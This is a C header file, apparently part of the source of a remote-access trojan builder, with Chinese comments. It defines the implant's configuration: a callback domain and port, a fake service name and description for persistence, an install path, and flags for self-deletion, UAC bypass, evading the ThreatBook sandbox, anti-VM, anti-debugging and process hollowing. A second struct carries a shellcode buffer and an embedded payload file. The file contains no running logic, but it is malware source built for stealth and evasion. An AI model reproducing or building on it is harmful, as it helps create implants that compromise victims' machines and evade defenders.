#pragma once
struct  MODIFY_DATA// 生成Dat文件结构
{
	char DNS[256];  //域名
	int  Port;		//端口
	char UpGroup[32];					//上线分组
	char Packet[32];						//备注
	char szCurrentDateTime[32];	//安装时间
	char ServiceName[50];			//服务名称
	char ServicePlay[50];				//服务显示
	char ServiceDesc[150];			//服务描述
	char ReleasePath[100];			//安装路径
	char ReleaseName[50];			//安装名称
	char szthisfile[MAX_PATH];    //当前运行文件
	int  Dele_zc;							//启动类型
	BYTE ismove;							//是否需要移动文件
	BYTE dllorexe;							//是生成的dll 还是exe
	BYTE selfDel;							//自删除
	BYTE kill;								//自杀
	BYTE Uac;								//绕过uac
	BYTE weibu;								//绕过微步沙箱
	BYTE vm;								//反虚拟机
	BYTE antidebug;							//反调试
	BYTE puppet;							//是否启用傀儡进程
	char Reserve[11];
};

typedef struct
{
	TCHAR Shellcode[10 * 1024];
	int  dwShellcodelen;
	TCHAR File[300 * 1024];
	int  dwFilelen;
	MODIFY_DATA modify_data;
	int RunSessionid;
}ShellcodeStr;

